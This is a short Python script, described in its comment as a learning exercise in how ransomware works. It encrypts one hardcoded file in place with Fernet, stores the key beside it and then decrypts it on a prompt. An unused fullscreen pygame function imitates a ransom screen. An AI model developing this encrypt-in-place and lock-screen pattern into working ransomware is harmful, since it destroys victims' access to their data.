#This Code was maded only for edicational and learning purposes, i wanted to learn how ransomware works 
import pygame
import os
import sys
from cryptography.fernet import Fernet 

key = Fernet.generate_key() #KEY TO ENCRYPT AND DECRYPT
def encrypt():
 #save key
 with open("KEY", "wb") as file_key:
     file_key.write(key)
 #load key
 loaded_key = Fernet(key)

 #Read original file
 with open("prueba.txt", "rb") as f:
    original_data = f.read()
 #encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded key

 encrypted_data = loaded_key.encrypt(original_data)

 #save encrypted file
 with open("prueba.txt", "wb") as f_encrypted:
    f_encrypted.write(encrypted_data)

def decrypt():
   input("decrypt?")
   #read file key 
   with open("KEY") as file_key:
      key_to_decrypt = file_key.read()
      
   decryptor = Fernet(key_to_decrypt)

   #read encrypted data
   with open("prueba.txt","rb") as f:
      encrypted_data = f.read()
      original_data = decryptor.decrypt(encrypted_data)
    #restore
   with open("prueba.txt","wb") as restored_file:
      restored_file.write(original_data)
    
encrypt()
decrypt()  
  









def fazwin():
    pygame.init() #init pygame
    pygame.mixer.init() #init pygame audio module
 # create window
    wind = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    pygame.display.set_caption("")
 #load img and music
    fazbear_img = pygame.image.load("./assets/img.jpg")
    pygame.mixer.music.load("./assets/aud.mp3")
    pygame.mixer.music.play(-1)
    execute_win = True
    # window loop
    while execute_win:
        for x in pygame.event.get():
            if x.type == pygame.QUIT:
                execute_win = False
     #load window
        wind.fill((0, 0, 0)) 
        wind.blit(fazbear_img, (0, 0))
        pygame.display.flip()
    pygame.quit()
